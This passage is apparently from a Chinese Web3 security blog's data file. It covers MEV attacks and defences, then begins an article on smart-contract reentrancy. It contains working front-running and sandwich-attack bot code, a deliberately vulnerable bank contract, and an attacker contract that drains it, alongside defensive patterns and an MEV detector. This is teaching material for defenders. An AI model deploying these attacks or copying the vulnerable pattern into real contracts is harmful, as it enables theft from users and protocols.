payable(highestBidder).transfer(highestBid);\\n        }\\n        \\n        highestBidder = msg.sender;\\n        highestBid = msg.value;\\n    }\\n}\\n```\\n\\n**\u653b\u51fb\u573a\u666f\uff1a**\\n\\n```javascript\\n// \u653b\u51fb\u8005\u76d1\u63a7\u5185\u5b58\u6c60\\nconst provider = new ethers.providers.WebSocketProvider(WEBSOCKET_URL);\\n\\nprovider.on(\'pending\', async (txHash) => {\\n    const tx = await provider.getTransaction(txHash);\\n    \\n    if (tx && tx.to === AUCTION_ADDRESS) {\\n        const decodedData = auctionInterface.parseTransaction({ data: tx.data });\\n        \\n        if (decodedData.name === \'bid\') {\\n            // \u53d1\u9001\u66f4\u9ad8gas\u4ef7\u683c\u7684\u4ea4\u6613\u62a2\u8dd1\\n            const frontRunTx = await auction.bid({\\n                value: tx.value.add(ethers.utils.parseEther(\'0.01\')),\\n                gasPrice: tx.gasPrice.mul(110).div(100) // \u63d0\u9ad810% gas\u4ef7\u683c\\n            });\\n            \\n            console.log(\'Front-run transaction:\', frontRunTx.hash);\\n        }\\n    }\\n});\\n```\\n\\n### 2. \u4e09\u660e\u6cbb\u653b\u51fb\uff08Sandwich Attack\uff09\\n\\n\u653b\u51fb\u8005\u5728\u76ee\u6807\u4ea4\u6613\u524d\u540e\u5404\u63d2\u5165\u4e00\u7b14\u4ea4\u6613\uff0c\u4ece\u4ef7\u683c\u6ed1\u70b9\u4e2d\u83b7\u5229\u3002\\n\\n```javascript\\n// \u4e09\u660e\u6cbb\u653b\u51fb\u793a\u4f8b\\nclass SandwichAttacker {\\n    constructor(provider, router, token) {\\n        this.provider = provider;\\n        this.router = router;\\n        this.token = token;\\n    }\\n    \\n    async detectVictim() {\\n        this.provider.on(\'pending\', async (txHash) => {\\n            const tx = await this.provider.getTransaction(txHash);\\n            \\n            if (this.isSwapTransaction(tx)) {\\n                await this.executeSandwich(tx);\\n            }\\n        });\\n    }\\n    \\n    async executeSandwich(victimTx) {\\n        const victimAmount = this.extractAmount(victimTx);\\n        \\n        // \u6b65\u9aa41: Front-run - \u4e70\u5165\u63a8\u9ad8\u4ef7\u683c\\n        const frontRunTx = await this.router.swapExactETHForTokens(\\n            0, // \u63a5\u53d7\u4efb\u4f55\u6570\u91cf\\n            [WETH, this.token],\\n            this.wallet.address,\\n            Date.now() + 1000,\\n            {\\n                value: victimAmount.mul(2),\\n                gasPrice: victimTx.gasPrice.add(ethers.utils.parseUnits(\'10\', \'gwei\'))\\n            }\\n        );\\n        \\n        console.log(\'Front-run tx:\', frontRunTx.hash);\\n        \\n        // \u6b65\u9aa42: \u7b49\u5f85\u53d7\u5bb3\u8005\u4ea4\u6613\u6267\u884c\\n        await victimTx.wait();\\n        \\n        // \u6b65\u9aa43: Back-run - \u5356\u51fa\u83b7\u5229\\n        const balance = await this.token.balanceOf(this.wallet.address);\\n        const backRunTx = await this.router.swapExactTokensForETH(\\n            balance,\\n            0,\\n            [this.token, WETH],\\n            this.wallet.address,\\n            Date.now() + 1000,\\n            {\\n                gasPrice: victimTx.gasPrice.add(ethers.utils.parseUnits(\'5\', \'gwei\'))\\n            }\\n        );\\n        \\n        console.log(\'Back-run tx:\', backRunTx.hash);\\n    }\\n    \\n    isSwapTransaction(tx) {\\n        if (!tx || !tx.data) return false;\\n        \\n        const methodId = tx.data.slice(0, 10);\\n        const swapMethods = [\\n            \'0x7ff36ab5\', // swapExactETHForTokens\\n            \'0x18cbafe5\', // swapExactTokensForETH\\n            \'0x38ed1739\', // swapExactTokensForTokens\\n        ];\\n        \\n        return swapMethods.includes(methodId);\\n    }\\n}\\n```\\n\\n### 3. \u6e05\u7b97\u62a2\u8dd1\\n\\n```solidity\\n// \u501f\u8d37\u534f\u8bae\u6e05\u7b97\\ncontract LendingProtocol {\\n    struct Position {\\n        uint256 collateral;\\n        uint256 debt;\\n        address owner;\\n    }\\n    \\n    mapping(address => Position) public positions;\\n    uint256 public constant LIQUIDATION_THRESHOLD = 150; // 150%\\n    \\n    function liquidate(address user) external {\\n        Position storage position = positions[user];\\n        \\n        uint256 collateralValue = getCollateralValue(position.collateral);\\n        uint256 debtValue = getDebtValue(position.debt);\\n        \\n        // \u68c0\u67e5\u662f\u5426\u53ef\u6e05\u7b97\\n        require(\\n            collateralValue * 100 < debtValue * LIQUIDATION_THRESHOLD,\\n            \\"Position is healthy\\"\\n        );\\n        \\n        // \u6e05\u7b97\u5956\u52b1\uff1a5%\\n        uint256 liquidationReward = position.collateral * 5 / 100;\\n        \\n        // \u8f6c\u79fb\u62b5\u62bc\u54c1\\n        token.transfer(msg.sender, position.collateral + liquidationReward);\\n        \\n        // \u6e05\u9664\u503a\u52a1\\n        delete positions[user];\\n    }\\n}\\n```\\n\\n**MEV\u673a\u5668\u4eba\u7ade\u4e89\uff1a**\\n\\n```javascript\\n// \u6e05\u7b97\u673a\u5668\u4eba\\nclass LiquidationBot {\\n    async monitorPositions() {\\n        const positions = await this.protocol.getAllPositions();\\n        \\n        for (const position of positions) {\\n            const health = await this.calculateHealth(position);\\n            \\n            if (health < 1.5) {\\n                await this.attemptLiquidation(position);\\n            }\\n        }\\n    }\\n    \\n    async attemptLiquidation(position) {\\n        // \u4f7f\u7528 Flashbots \u907f\u514d\u88ab\u62a2\u8dd1\\n        const bundle = [\\n            {\\n                transaction: await this.protocol.populateTransaction.liquidate(position.user),\\n                signer: this.wallet\\n            }\\n        ];\\n        \\n        const signedBundle = await flashbotsProvider.signBundle(bundle);\\n        const simulation = await flashbotsProvider.simulate(signedBundle, targetBlock);\\n        \\n        if (simulation.firstRevert) {\\n            console.log(\'Simulation failed:\', simulation.firstRevert);\\n            return;\\n        }\\n        \\n        // \u53d1\u9001bundle\\n        const bundleSubmission = await flashbotsProvider.sendRawBundle(\\n            signedBundle,\\n            targetBlock\\n        );\\n        \\n        console.log(\'Bundle submitted:\', bundleSubmission.bundleHash);\\n    }\\n}\\n```\\n\\n## \u9632\u5fa1\u7b56\u7565\\n\\n### 1. \u4f7f\u7528\u79c1\u6709\u4ea4\u6613\u6c60\\n\\n```javascript\\n// Flashbots \u79c1\u6709\u4ea4\u6613\u793a\u4f8b\\nconst { FlashbotsBundleProvider } = require(\'@flashbots/ethers-provider-bundle\');\\n\\nasync function sendPrivateTransaction(tx) {\\n    const flashbotsProvider = await FlashbotsBundleProvider.create(\\n        provider,\\n        authSigner,\\n        \'https://relay.flashbots.net\'\\n    );\\n    \\n    const targetBlock = await provider.getBlockNumber() + 1;\\n    \\n    const bundle = [\\n        {\\n            signer: wallet,\\n            transaction: tx\\n        }\\n    ];\\n    \\n    const signedBundle = await flashbotsProvider.signBundle(bundle);\\n    \\n    // \u6a21\u62dfbundle\\n    const simulation = await flashbotsProvider.simulate(signedBundle, targetBlock);\\n    console.log(\'Simulation:\', simulation);\\n    \\n    // \u53d1\u9001bundle\\n    const bundleSubmission = await flashbotsProvider.sendRawBundle(\\n        signedBundle,\\n        targetBlock\\n    );\\n    \\n    const waitResponse = await bundleSubmission.wait();\\n    \\n    if (waitResponse === FlashbotsBundleResolution.BundleIncluded) {\\n        console.log(\'Bundle included in block\');\\n    } else if (waitResponse === FlashbotsBundleResolution.BlockPassedWithoutInclusion) {\\n        console.log(\'Bundle not included\');\\n    }\\n}\\n```\\n\\n### 2. \u63d0\u4ea4-\u63ed\u793a\u65b9\u6848\uff08Commit-Reveal\uff09\\n\\n```solidity\\n// \u9632\u62a2\u8dd1\u7684\u62cd\u5356\u5408\u7ea6\\ncontract SecureAuction {\\n    struct Bid {\\n        bytes32 commitment;\\n        uint256 deposit;\\n        bool revealed;\\n    }\\n    \\n    mapping(address => Bid) public bids;\\n    uint256 public revealDeadline;\\n    uint256 public auctionEnd;\\n    \\n    address public highestBidder;\\n    uint256 public highestBid;\\n    \\n    // \u9636\u6bb51: \u63d0\u4ea4\u627f\u8bfa\\n    function commitBid(bytes32 commitment) external payable {\\n        require(block.timestamp < revealDeadline, \\"Commit period ended\\");\\n        require(bids[msg.sender].commitment == bytes32(0), \\"Already committed\\");\\n        \\n        bids[msg.sender] = Bid({\\n            commitment: commitment,\\n            deposit: msg.value,\\n            revealed: false\\n        });\\n    }\\n    \\n    // \u9636\u6bb52: \u63ed\u793a\u51fa\u4ef7\\n    function revealBid(uint256 value, bytes32 secret) external {\\n        require(block.timestamp >= revealDeadline, \\"Reveal period not started\\");\\n        require(block.timestamp < auctionEnd, \\"Auction ended\\");\\n        \\n        Bid storage bid = bids[msg.sender];\\n        require(!bid.revealed, \\"Already revealed\\");\\n        \\n        // \u9a8c\u8bc1\u627f\u8bfa\\n        bytes32 commitment = keccak256(abi.encodePacked(value, secret));\\n        require(commitment == bid.commitment, \\"Invalid reveal\\");\\n        \\n        bid.revealed = true;\\n        \\n        // \u68c0\u67e5\u662f\u5426\u662f\u6700\u9ad8\u51fa\u4ef7\\n        if (value > highestBid && bid.deposit >= value) {\\n            if (highestBidder != address(0)) {\\n                // \u9000\u8fd8\u524d\u4e00\u4e2a\u6700\u9ad8\u51fa\u4ef7\u8005\\n                payable(highestBidder).transfer(highestBid);\\n            }\\n            \\n            highestBidder = msg.sender;\\n            highestBid = value;\\n        }\\n        \\n        // \u9000\u8fd8\u591a\u4f59\u7684\u62bc\u91d1\\n        if (bid.deposit > value) {\\n            payable(msg.sender).transfer(bid.deposit - value);\\n        }\\n    }\\n}\\n```\\n\\n**\u4f7f\u7528\u793a\u4f8b\uff1a**\\n\\n```javascript\\n// \u7528\u6237\u63d0\u4ea4\u51fa\u4ef7\\nasync function placeBid(amount) {\\n    const secret = ethers.utils.randomBytes(32);\\n    const commitment = ethers.utils.keccak256(\\n        ethers.utils.defaultAbiCoder.encode(\\n            [\'uint256\', \'bytes32\'],\\n            [amount, secret]\\n        )\\n    );\\n    \\n    // \u9636\u6bb51: \u63d0\u4ea4\u627f\u8bfa\\n    const commitTx = await auction.commitBid(commitment, {\\n        value: amount\\n    });\\n    await commitTx.wait();\\n    \\n    // \u4fdd\u5b58secret\u7528\u4e8e\u540e\u7eed\u63ed\u793a\\n    localStorage.setItem(\'bidSecret\', ethers.utils.hexlify(secret));\\n    localStorage.setItem(\'bidAmount\', amount.toString());\\n}\\n\\nasync function revealBid() {\\n    const secret = localStorage.getItem(\'bidSecret\');\\n    const amount = localStorage.getItem(\'bidAmount\');\\n    \\n    // \u9636\u6bb52: \u63ed\u793a\u51fa\u4ef7\\n    const revealTx = await auction.revealBid(amount, secret);\\n    await revealTx.wait();\\n}\\n```\\n\\n### 3. \u6ed1\u70b9\u4fdd\u62a4\\n\\n```solidity\\n// DEX\u4ea4\u6613\u6ed1\u70b9\u4fdd\u62a4\\ncontract SecureDEX {\\n    function swapWithSlippageProtection(\\n        address tokenIn,\\n        address tokenOut,\\n        uint256 amountIn,\\n        uint256 minAmountOut,\\n        uint256 maxPriceImpact // \u4ee5\u57fa\u70b9\u8868\u793a\uff0c\u4f8b\u598250 = 0.5%\\n    ) external returns (uint256 amountOut) {\\n        // \u83b7\u53d6\u5f53\u524d\u4ef7\u683c\\n        uint256 currentPrice = getPrice(tokenIn, tokenOut);\\n        \\n        // \u8ba1\u7b97\u9884\u671f\u8f93\u51fa\\n        uint256 expectedOut = calculateExpectedOutput(amountIn, currentPrice);\\n        \\n        // \u6267\u884c\u4ea4\u6362\\n        amountOut = _swap(tokenIn, tokenOut, amountIn);\\n        \\n        // \u68c0\u67e5\u6ed1\u70b9\\n        require(amountOut >= minAmountOut, \\"Slippage too high\\");\\n        \\n        // \u68c0\u67e5\u4ef7\u683c\u5f71\u54cd\\n        uint256 priceImpact = calculatePriceImpact(amountIn, amountOut, currentPrice);\\n        require(priceImpact <= maxPriceImpact, \\"Price impact too high\\");\\n        \\n        return amountOut;\\n    }\\n    \\n    function calculatePriceImpact(\\n        uint256 amountIn,\\n        uint256 amountOut,\\n        uint256 initialPrice\\n    ) internal pure returns (uint256) {\\n        uint256 executionPrice = (amountIn * 1e18) / amountOut;\\n        uint256 impact = ((executionPrice - initialPrice) * 10000) / initialPrice;\\n        return impact;\\n    }\\n}\\n```\\n\\n### 4. \u65f6\u95f4\u9501\u548c\u5ef6\u8fdf\u6267\u884c\\n\\n```solidity\\n// \u5e26\u65f6\u95f4\u9501\u7684\u4ea4\u6613\\ncontract TimelockProtection {\\n    struct PendingTransaction {\\n        address target;\\n        uint256 value;\\n        bytes data;\\n        uint256 executeAfter;\\n        bool executed;\\n    }\\n    \\n    mapping(bytes32 => PendingTransaction) public pendingTxs;\\n    uint256 public constant MIN_DELAY = 1 hours;\\n    uint256 public constant MAX_DELAY = 7 days;\\n    \\n    event TransactionQueued(bytes32 indexed txHash, uint256 executeAfter);\\n    event TransactionExecuted(bytes32 indexed txHash);\\n    \\n    function queueTransaction(\\n        address target,\\n        uint256 value,\\n        bytes memory data,\\n        uint256 delay\\n    ) external returns (bytes32) {\\n        require(delay >= MIN_DELAY && delay <= MAX_DELAY, \\"Invalid delay\\");\\n        \\n        bytes32 txHash = keccak256(abi.encode(target, value, data, block.timestamp));\\n        uint256 executeAfter = block.timestamp + delay;\\n        \\n        pendingTxs[txHash] = PendingTransaction({\\n            target: target,\\n            value: value,\\n            data: data,\\n            executeAfter: executeAfter,\\n            executed: false\\n        });\\n        \\n        emit TransactionQueued(txHash, executeAfter);\\n        return txHash;\\n    }\\n    \\n    function executeTransaction(bytes32 txHash) external {\\n        PendingTransaction storage pendingTx = pendingTxs[txHash];\\n        \\n        require(!pendingTx.executed, \\"Already executed\\");\\n        require(block.timestamp >= pendingTx.executeAfter, \\"Too early\\");\\n        \\n        pendingTx.executed = true;\\n        \\n        (bool success, ) = pendingTx.target.call{value: pendingTx.value}(pendingTx.data);\\n        require(success, \\"Execution failed\\");\\n        \\n        emit TransactionExecuted(txHash);\\n    }\\n}\\n```\\n\\n## MEV\u4fdd\u62a4\u670d\u52a1\\n\\n### 1. Flashbots Protect\\n\\n```javascript\\n// \u4f7f\u7528 Flashbots Protect RPC\\nconst provider = new ethers.providers.JsonRpcProvider(\\n    \'https://rpc.flashbots.net\'\\n);\\n\\n// \u53d1\u9001\u4ea4\u6613\u5230Flashbots\\nasync function sendProtectedTransaction(tx) {\\n    const signedTx = await wallet.signTransaction(tx);\\n    const txResponse = await provider.sendTransaction(signedTx);\\n    \\n    console.log(\'Protected transaction:\', txResponse.hash);\\n    return txResponse;\\n}\\n```\\n\\n### 2. Eden Network\\n\\n```javascript\\n// Eden Network \u914d\u7f6e\\nconst edenProvider = new ethers.providers.JsonRpcProvider(\\n    \'https://api.edennetwork.io/v1/rpc\'\\n);\\n\\n// \u8d28\u62bcEDEN\u4ee3\u5e01\u83b7\u5f97\u4f18\u5148\u6743\\nasync function stakeForPriority(amount) {\\n    const edenToken = new ethers.Contract(EDEN_TOKEN, ERC20_ABI, wallet);\\n    const stakingContract = new ethers.Contract(EDEN_STAKING, STAKING_ABI, wallet);\\n    \\n    // \u6279\u51c6\\n    await edenToken.approve(EDEN_STAKING, amount);\\n    \\n    // \u8d28\u62bc\\n    await stakingContract.stake(amount);\\n}\\n```\\n\\n### 3. CowSwap (MEV Blocker)\\n\\n```javascript\\n// CowSwap \u8ba2\u5355\\nconst { OrderBookApi, OrderKind, SigningScheme } = require(\'@cowprotocol/cow-sdk\');\\n\\nasync function createCowSwapOrder(sellToken, buyToken, amount) {\\n    const orderBookApi = new OrderBookApi({ chainId: 1 });\\n    \\n    const order = {\\n        sellToken: sellToken,\\n        buyToken: buyToken,\\n        sellAmount: amount.toString(),\\n        buyAmount: \'0\', // \u8ba9\u6c42\u89e3\u5668\u8ba1\u7b97\\n        validTo: Math.floor(Date.now() / 1000) + 3600, // 1\u5c0f\u65f6\u6709\u6548\u671f\\n        appData: \'0x0000000000000000000000000000000000000000000000000000000000000000\',\\n        feeAmount: \'0\',\\n        kind: OrderKind.SELL,\\n        partiallyFillable: false,\\n        sellTokenBalance: \'erc20\',\\n        buyTokenBalance: \'erc20\'\\n    };\\n    \\n    const signature = await signOrder(order, wallet);\\n    \\n    const orderId = await orderBookApi.sendOrder({\\n        ...order,\\n        signature,\\n        signingScheme: SigningScheme.EIP712\\n    });\\n    \\n    console.log(\'Order ID:\', orderId);\\n    return orderId;\\n}\\n```\\n\\n## MEV\u76d1\u63a7\u548c\u5206\u6790\\n\\n### 1. MEV\u68c0\u6d4b\\n\\n```python\\n# MEV\u4ea4\u6613\u68c0\u6d4b\u811a\u672c\\nimport requests\\nfrom web3 import Web3\\n\\nclass MEVDetector:\\n    def __init__(self, web3_provider):\\n        self.w3 = Web3(Web3.HTTPProvider(web3_provider))\\n    \\n    def analyze_block(self, block_number):\\n        block = self.w3.eth.get_block(block_number, full_transactions=True)\\n        mev_transactions = []\\n        \\n        for i, tx in enumerate(block.transactions):\\n            # \u68c0\u67e5\u4e09\u660e\u6cbb\u653b\u51fb\\n            if i > 0 and i < len(block.transactions) - 1:\\n                prev_tx = block.transactions[i-1]\\n                next_tx = block.transactions[i+1]\\n                \\n                if self.is_sandwich(prev_tx, tx, next_tx):\\n                    mev_transactions.append({\\n                        \'type\': \'sandwich\',\\n                        \'victim\': tx[\'hash\'].hex(),\\n                        \'frontrun\': prev_tx[\'hash\'].hex(),\\n                        \'backrun\': next_tx[\'hash\'].hex(),\\n                        \'profit\': self.calculate_profit(prev_tx, next_tx)\\n                    })\\n            \\n            # \u68c0\u67e5\u62a2\u8dd1\\n            if self.is_frontrun(tx, block.transactions[:i]):\\n                mev_transactions.append({\\n                    \'type\': \'frontrun\',\\n                    \'transaction\': tx[\'hash\'].hex()\\n                })\\n        \\n        return mev_transactions\\n    \\n    def is_sandwich(self, tx1, tx2, tx3):\\n        # \u68c0\u67e5\u662f\u5426\u662f\u540c\u4e00\u4e2aDEX\\n        if tx1[\'to\'] != tx3[\'to\']:\\n            return False\\n        \\n        # \u68c0\u67e5\u662f\u5426\u662f\u76f8\u540c\u7684\u4ea4\u6613\u5bf9\\n        # \u7b80\u5316\u7248\u672c\uff0c\u5b9e\u9645\u9700\u8981\u89e3\u6790\u4ea4\u6613\u6570\u636e\\n        return (\\n            tx1[\'from\'] == tx3[\'from\'] and\\n            tx1[\'gasPrice\'] > tx2[\'gasPrice\'] and\\n            tx3[\'gasPrice\'] > tx2[\'gasPrice\']\\n        )\\n    \\n    def calculate_profit(self, frontrun_tx, backrun_tx):\\n        # \u8ba1\u7b97MEV\u5229\u6da6\\n        # \u9700\u8981\u89e3\u6790\u4ea4\u6613receipt\u548c\u4e8b\u4ef6\\n        pass\\n```\\n\\n### 2. MEV\u4eea\u8868\u677f\\n\\n```javascript\\n// MEV\u7edf\u8ba1API\\nconst express = require(\'express\');\\nconst app = express();\\n\\napp.get(\'/api/mev/stats\', async (req, res) => {\\n    const stats = await getMEVStats();\\n    res.json(stats);\\n});\\n\\nasync function getMEVStats() {\\n    const latestBlock = await provider.getBlockNumber();\\n    const blocks = await Promise.all(\\n        Array.from({ length: 100 }, (_, i) => \\n            provider.getBlockWithTransactions(latestBlock - i)\\n        )\\n    );\\n    \\n    let totalMEV = ethers.BigNumber.from(0);\\n    let sandwichCount = 0;\\n    let frontrunCount = 0;\\n    \\n    for (const block of blocks) {\\n        const analysis = await analyzeBlockForMEV(block);\\n        totalMEV = totalMEV.add(analysis.totalValue);\\n        sandwichCount += analysis.sandwichAttacks;\\n        frontrunCount += analysis.frontrunAttacks;\\n    }\\n    \\n    return {\\n        totalMEVExtracted: ethers.utils.formatEther(totalMEV),\\n        sandwichAttacks: sandwichCount,\\n        frontrunAttacks: frontrunCount,\\n        averageMEVPerBlock: ethers.utils.formatEther(totalMEV.div(blocks.length))\\n    };\\n}\\n```\\n\\n## \u672a\u6765\u53d1\u5c55\\n\\n### 1. MEV-Boost\\n\\n\u4ee5\u592a\u574a\u5408\u5e76\u540e\u7684MEV\u89e3\u51b3\u65b9\u6848\uff0c\u5206\u79bb\u533a\u5757\u6784\u5efa\u548c\u63d0\u8bae\u3002\\n\\n### 2. Proposer-Builder Separation (PBS)\\n\\n\u5c06\u533a\u5757\u63d0\u8bae\u8005\u548c\u6784\u5efa\u8005\u89d2\u8272\u5206\u79bb\uff0c\u51cf\u5c11MEV\u5bf9\u5171\u8bc6\u7684\u5f71\u54cd\u3002\\n\\n### 3. \u52a0\u5bc6\u5185\u5b58\u6c60\\n\\n\u4f7f\u7528\u9608\u503c\u52a0\u5bc6\u6280\u672f\u4fdd\u62a4\u4ea4\u6613\u9690\u79c1\uff0c\u76f4\u5230\u88ab\u6253\u5305\u8fdb\u533a\u5757\u3002\\n\\n## \u603b\u7ed3\\n\\nMEV\u662fDeFi\u751f\u6001\u7cfb\u7edf\u4e2d\u4e0d\u53ef\u907f\u514d\u7684\u73b0\u8c61\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\uff1a\\n\\n- \ud83d\udee1\ufe0f **\u4f7f\u7528\u9632\u62a4\u5de5\u5177**: Flashbots, Eden, CowSwap\\n- \ud83d\udd12 **\u5b9e\u65bd\u5b89\u5168\u6a21\u5f0f**: Commit-Reveal, \u65f6\u95f4\u9501\\n- \ud83d\udcca **\u76d1\u63a7\u548c\u5206\u6790**: \u53ca\u65f6\u53d1\u73b0\u548c\u54cd\u5e94MEV\u653b\u51fb\\n- \ud83d\udca1 **\u6559\u80b2\u7528\u6237**: \u63d0\u9ad8\u5bf9MEV\u98ce\u9669\u7684\u8ba4\u8bc6\\n\\n\u8bb0\u4f4f\uff1a**\u5728DeFi\u4e2d\uff0c\u4ea4\u6613\u9690\u79c1\u548c\u987a\u5e8f\u4fdd\u62a4\u81f3\u5173\u91cd\u8981**\u3002\\n\\n---\\n\\n**AutoSec** - \u5b88\u62a4\u4f60\u7684\u6bcf\u4e00\u7b14\u4ea4\u6613"},{"id":"reentrancy-attack-analysis","metadata":{"permalink":"/reentrancy-attack-analysis","editUrl":"https://github.com/pfyangf/pfyangf.github.io/tree/main/blog/2025/02-05-reentrancy-attack-analysis.md","source":"@site/blog/2025/02-05-reentrancy-attack-analysis.md","title":"\u6df1\u5ea6\u89e3\u6790\uff1a\u91cd\u5165\u653b\u51fb\u53ca\u5176\u9632\u5fa1\u7b56\u7565","description":"\u91cd\u5165\u653b\u51fb\uff08Reentrancy Attack\uff09\u662f\u667a\u80fd\u5408\u7ea6\u5b89\u5168\u9886\u57df\u6700\u81ed\u540d\u662d\u8457\u7684\u6f0f\u6d1e\u4e4b\u4e00\u30022016\u5e74\u7684 The DAO \u4e8b\u4ef6\u5c31\u662f\u56e0\u4e3a\u91cd\u5165\u6f0f\u6d1e\u5bfc\u81f4\u4e86\u4ef7\u503c 6000 \u4e07\u7f8e\u5143\u7684\u4ee5\u592a\u574a\u88ab\u76d7\uff0c\u8fd9\u4e00\u4e8b\u4ef6\u751a\u81f3\u5bfc\u81f4\u4e86\u4ee5\u592a\u574a\u7684\u786c\u5206\u53c9\u3002","date":"2025-02-05T00:00:00.000Z","tags":[{"inline":true,"label":"\u667a\u80fd\u5408\u7ea6\u5b89\u5168","permalink":"/tags/\u667a\u80fd\u5408\u7ea6\u5b89\u5168"},{"inline":true,"label":"\u91cd\u5165\u653b\u51fb","permalink":"/tags/\u91cd\u5165\u653b\u51fb"},{"inline":true,"label":"Solidity","permalink":"/tags/solidity"},{"inline":true,"label":"DeFi\u5b89\u5168","permalink":"/tags/de-fi\u5b89\u5168"},{"inline":true,"label":"\u6f0f\u6d1e\u5206\u6790","permalink":"/tags/\u6f0f\u6d1e\u5206\u6790"}],"readingTime":3.44,"hasTruncateMarker":true,"authors":[{"name":"AutoSec Team","title":"Web3 Security Researchers","url":"https://autosec.dev","imageURL":"/img/autosec.logo.png","key":"autosec","page":null}],"frontMatter":{"slug":"reentrancy-attack-analysis","title":"\u6df1\u5ea6\u89e3\u6790\uff1a\u91cd\u5165\u653b\u51fb\u53ca\u5176\u9632\u5fa1\u7b56\u7565","authors":["autosec"],"tags":["\u667a\u80fd\u5408\u7ea6\u5b89\u5168","\u91cd\u5165\u653b\u51fb","Solidity","DeFi\u5b89\u5168","\u6f0f\u6d1e\u5206\u6790"]},"unlisted":false,"prevItem":{"title":"MEV\u653b\u51fb\u5168\u666f\u56fe\uff1a\u4ece\u4e09\u660e\u6cbb\u653b\u51fb\u5230\u9632\u5fa1\u7b56\u7565","permalink":"/mev-attacks-prevention"},"nextItem":{"title":"DeFi\u95ea\u7535\u8d37\u653b\u51fb\u6df1\u5ea6\u5256\u6790\uff1a\u539f\u7406\u3001\u6848\u4f8b\u4e0e\u9632\u5fa1","permalink":"/defi-flash-loan-attacks"}},"content":"\u91cd\u5165\u653b\u51fb\uff08Reentrancy Attack\uff09\u662f\u667a\u80fd\u5408\u7ea6\u5b89\u5168\u9886\u57df\u6700\u81ed\u540d\u662d\u8457\u7684\u6f0f\u6d1e\u4e4b\u4e00\u30022016\u5e74\u7684 The DAO \u4e8b\u4ef6\u5c31\u662f\u56e0\u4e3a\u91cd\u5165\u6f0f\u6d1e\u5bfc\u81f4\u4e86\u4ef7\u503c 6000 \u4e07\u7f8e\u5143\u7684\u4ee5\u592a\u574a\u88ab\u76d7\uff0c\u8fd9\u4e00\u4e8b\u4ef6\u751a\u81f3\u5bfc\u81f4\u4e86\u4ee5\u592a\u574a\u7684\u786c\u5206\u53c9\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \u4ec0\u4e48\u662f\u91cd\u5165\u653b\u51fb\uff1f\\n\\n\u91cd\u5165\u653b\u51fb\u53d1\u751f\u5728\u667a\u80fd\u5408\u7ea6\u5728\u5b8c\u6210\u72b6\u6001\u66f4\u65b0\u4e4b\u524d\u8c03\u7528\u5916\u90e8\u5408\u7ea6\u65f6\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u65f6\u95f4\u7a97\u53e3\uff0c\u5728\u539f\u59cb\u8c03\u7528\u5b8c\u6210\u4e4b\u524d\u91cd\u590d\u8c03\u7528\u540c\u4e00\u4e2a\u51fd\u6570\uff0c\u4ece\u800c\u591a\u6b21\u63d0\u53d6\u8d44\u91d1\u6216\u6267\u884c\u6076\u610f\u64cd\u4f5c\u3002\\n\\n### \u6f0f\u6d1e\u4ee3\u7801\u793a\u4f8b\\n\\n```solidity\\n// \u5b58\u5728\u91cd\u5165\u6f0f\u6d1e\u7684\u5408\u7ea6\\ncontract VulnerableBank {\\n    mapping(address => uint256) public balances;\\n    \\n    function withdraw(uint256 amount) public {\\n        require(balances[msg.sender] >= amount, \\"Insufficient balance\\");\\n        \\n        // \u5371\u9669\uff1a\u5728\u66f4\u65b0\u72b6\u6001\u524d\u8fdb\u884c\u5916\u90e8\u8c03\u7528\\n        (bool success, ) = msg.sender.call{value: amount}(\\"\\");\\n        require(success, \\"Transfer failed\\");\\n        \\n        // \u72b6\u6001\u66f4\u65b0\u5728\u5916\u90e8\u8c03\u7528\u4e4b\u540e\\n        balances[msg.sender] -= amount;\\n    }\\n    \\n    function deposit() public payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n}\\n```\\n\\n### \u653b\u51fb\u5408\u7ea6\u793a\u4f8b\\n\\n```solidity\\ncontract Attacker {\\n    VulnerableBank public bank;\\n    uint256 public attackAmount;\\n    \\n    constructor(address _bankAddress) {\\n        bank = VulnerableBank(_bankAddress);\\n    }\\n    \\n    function attack() public payable {\\n        attackAmount = msg.value;\\n        bank.deposit{value: msg.value}();\\n        bank.withdraw(msg.value);\\n    }\\n    \\n    // \u63a5\u6536\u4ee5\u592a\u574a\u65f6\u81ea\u52a8\u91cd\u5165\\n    receive() external payable {\\n        if (address(bank).balance >= attackAmount) {\\n            bank.withdraw(attackAmount);\\n        }\\n    }\\n}\\n```\\n\\n## \u653b\u51fb\u6d41\u7a0b\u5206\u6790\\n\\n1. **\u521d\u59cb\u5b58\u6b3e**\uff1a\u653b\u51fb\u8005\u5411\u6f0f\u6d1e\u5408\u7ea6\u5b58\u5165 1 ETH\\n2. **\u53d1\u8d77\u63d0\u6b3e**\uff1a\u8c03\u7528 `withdraw(1 ETH)`\\n3. **\u89e6\u53d1\u56de\u8c03**\uff1a\u5408\u7ea6\u5411\u653b\u51fb\u8005\u8f6c\u8d26\uff0c\u89e6\u53d1\u653b\u51fb\u5408\u7ea6\u7684 `receive()` \u51fd\u6570\\n4. **\u91cd\u5165\u8c03\u7528**\uff1a\u5728\u4f59\u989d\u66f4\u65b0\u524d\uff0c\u653b\u51fb\u5408\u7ea6\u518d\u6b21\u8c03\u7528 `withdraw(1 ETH)`\\n5. **\u5faa\u73af\u653b\u51fb**\uff1a\u91cd\u590d\u6b65\u9aa4 3-4\uff0c\u76f4\u5230\u5408\u7ea6\u4f59\u989d\u8017\u5c3d\\n\\n## \u9632\u5fa1\u7b56\u7565\\n\\n### 1. Checks-Effects-Interactions \u6a21\u5f0f\\n\\n\u8fd9\u662f\u6700\u57fa\u672c\u4e5f\u662f\u6700\u91cd\u8981\u7684\u9632\u5fa1\u6a21\u5f0f\uff1a\\n\\n```solidity\\ncontract SecureBank {\\n    mapping(address => uint256) public balances;\\n    \\n    function withdraw(uint256 amount) public {\\n        // Checks: \u68c0\u67e5\u6761\u4ef6\\n        require(balances[msg.sender] >= amount, \\"Insufficient balance\\");\\n        \\n        // Effects: \u66f4\u65b0\u72b6\u6001\\n        balances[msg.sender] -= amount;\\n        \\n        // Interactions: \u5916\u90e8\u4ea4\u4e92\\n        (bool success, ) = msg.sender.call{value: amount}(\\"\\");\\n        require(success, \\"Transfer failed\\");\\n    }\\n}\\n```\\n\\n### 2. \u4f7f\u7528 ReentrancyGuard\\n\\nOpenZeppelin 